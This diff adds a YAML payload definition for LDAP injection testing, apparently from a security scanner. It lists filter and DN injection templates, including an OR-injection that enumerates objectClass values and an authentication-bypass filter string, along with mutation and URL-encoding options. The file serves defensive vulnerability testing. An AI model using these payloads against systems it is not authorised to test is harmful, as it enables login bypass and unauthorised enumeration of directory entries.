@@ -1,0 +1,48 @@
+family_id: ldapi
+description: >-
+  LDAP-injection probes for filter-injection and DN-injection contexts.
+  Conservative read-only seeds; the validator pairs them with a benign
+  base DN for differential confirmation.
+cwe_ids: [90]
+owasp_top10:
+  - 'A03:2021'
+risk_level: medium
+requires_approval: false
+oast_required: false
+payloads:
+  - id: filter_wildcard
+    template: '*'
+    confidence: suspected
+    notes: Bare wildcard; matches every entry.
+  - id: filter_or_objectclass
+    template: '*)(objectClass=*'
+    confidence: likely
+    notes: OR-injection enumerating all objectClass values.
+  - id: filter_authn_bypass
+    template: '*)(uid=*))(|(uid=*'
+    confidence: likely
+    notes: Authn-bypass closing parenthesis trick.
+  - id: filter_canary
+    template: '*)(cn={canary}'
+    confidence: confirmed
+    notes: Inject a {canary} marker; confirms reflection in audit log.
+  - id: dn_inject_canary
+    template: 'cn={canary},dc=example,dc=com'
+    confidence: suspected
+    notes: DN-injection probe; differential vs control DN.
+  - id: filter_error_paren
+    template: '('
+    confidence: suspected
+    notes: Unbalanced paren; provokes parser-error responses.
+mutations:
+  - name: case_flip
+    description: LDAP attribute names are case-insensitive — flips for filter research.
+  - name: whitespace_alt
+    description: Whitespace inside filters tests parser robustness.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw filter / DN payload.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for query-string sinks.
